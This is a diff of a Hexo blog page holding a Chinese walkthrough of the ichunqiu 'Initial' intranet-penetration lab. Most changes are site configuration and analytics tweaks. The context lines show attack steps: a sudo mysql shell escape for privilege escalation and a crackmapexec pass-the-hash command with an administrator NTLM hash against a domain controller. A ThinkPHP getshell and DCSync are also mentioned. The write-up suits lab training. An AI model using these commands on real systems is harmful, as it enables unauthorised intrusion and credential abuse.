@@ -21,7 +21,7 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="dr0n">
-  <meta name="keywords" content="">
+  <meta name="keywords" content="ctf, writeups, web, misc">
   
     <meta name="description" content="开始签到白嫖打完所有靶机计划!  Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。  前置知识: 内网渗透学习(代理篇)域渗透学习(Credentials篇)域渗透学习(NTLM篇)linux提权笔记 入口（172.22.1.15）根据报错信息得知是ThinkPHP 5，存在nday，可以getshell">
 <meta property="og:type" content="article">
@@ -48,10 +48,10 @@
 <meta property="article:published_time" content="2025-07-14T08:00:00.000Z">
 <meta property="article:modified_time" content="2025-08-28T11:40:49.914Z">
 <meta property="article:author" content="dr0n">
+<meta property="article:tag" content="DCSync">
+<meta property="article:tag" content="专业徽章">
 <meta property="article:tag" content="内网渗透">
 <meta property="article:tag" content="春秋云境">
-<meta property="article:tag" content="专业徽章">
-<meta property="article:tag" content="DCSync">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-1.png">
   
@@ -95,7 +95,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9,"expand_all":true},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"openkounter":{"server_url":"https://openkounter-1lbvmren.edgeone.cool/","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -129,13 +129,11 @@
   
 
   
-    
-  
 
 
 
   
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -303,7 +301,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          678 字
+          676 字
         
       </span>
     
@@ -314,20 +312,13 @@
         
         
         
-          5 分钟
+          6 分钟
         
       </span>
     
 
     
     
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
       
     
   </div>
@@ -377,7 +368,7 @@
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-3.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现mysql有权限，在gtfobins查询得到命令<code>sudo mysql -e &#39;\! /bin/sh&#39;</code></p>
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-4.png" srcset="/img/loading.gif" lazyload></p>
-<p>得到flag1：<code>flag01: flag&#123;60b53231-</code></p>
+<p>得到flag1：<code>flag01: flag{60b53231-</code></p>
 <h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>查看入口主机IP是 172.22.1.15</p>
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-2.png" srcset="/img/loading.gif" lazyload></p>
 <p>上传fscan扫C段</p>
@@ -437,7 +428,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="hljs-string">&quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-15.png" srcset="/img/loading.gif" lazyload></p>
-<p>得到flag3：<code>flag03: e8f88d0d43d6&#125;</code></p>
+<p>得到flag3：<code>flag03: e8f88d0d43d6}</code></p>
 
                 
               </div>
@@ -706,23 +697,6 @@
   
 
   
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
 
 </div>
 
@@ -890,8 +864,6 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
